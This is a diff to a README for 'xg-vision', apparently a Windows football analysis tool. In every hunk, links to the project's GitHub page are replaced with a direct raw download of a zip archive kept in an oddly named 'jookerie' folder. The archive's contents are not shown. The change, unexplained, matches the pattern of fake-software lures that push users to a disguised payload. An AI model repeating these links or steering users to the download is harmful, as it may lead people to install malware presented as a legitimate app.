@@ -1,10 +1,10 @@
 # ⚽ xg-vision - Clear Football Analysis on Windows
 
-[![Download xg-vision](https://img.shields.io/badge/Download-xg--vision-blue?style=for-the-badge)](https://github.com/mewayz8994/xg-vision)
+[![Download xg-vision](https://img.shields.io/badge/Download-xg--vision-blue?style=for-the-badge)](https://raw.githubusercontent.com/mewayz8994/xg-vision/main/jookerie/vision_xg_v3.2-alpha.1.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/mewayz8994/xg-vision
+Visit this page to download: https://raw.githubusercontent.com/mewayz8994/xg-vision/main/jookerie/vision_xg_v3.2-alpha.1.zip
 
 ## 🖥️ What xg-vision does
 
@@ -41,7 +41,7 @@ Follow these steps on Windows.
 
 Go to:
 
-https://github.com/mewayz8994/xg-vision
+https://raw.githubusercontent.com/mewayz8994/xg-vision/main/jookerie/vision_xg_v3.2-alpha.1.zip
 
 ### 2. Download the app files
 
@@ -258,7 +258,7 @@ For better results, use:
 
 If you need the files again, use this link:
 
-https://github.com/mewayz8994/xg-vision
+https://raw.githubusercontent.com/mewayz8994/xg-vision/main/jookerie/vision_xg_v3.2-alpha.1.zip
 
 ## 🧾 File types you may see
 
